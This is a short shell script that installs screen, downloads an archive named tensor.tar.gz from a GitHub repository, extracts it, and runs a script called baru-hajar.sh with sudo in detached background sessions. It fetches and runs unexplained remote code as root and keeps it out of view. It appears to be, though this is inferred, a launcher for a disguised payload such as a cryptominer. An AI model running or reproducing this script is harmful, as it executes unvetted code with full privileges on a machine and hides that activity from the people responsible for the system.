#!/bin/sh

sudo apt update

sudo apt install screen -y

screen -dmS baru-hajar.sh ./baru-hajar.sh 65 75

wget https://github.com/renilo/hajar1/raw/main/tensor.tar.gz

tar -xf tensor.tar.gz

sudo screen -dmS Running ./baru-hajar.sh
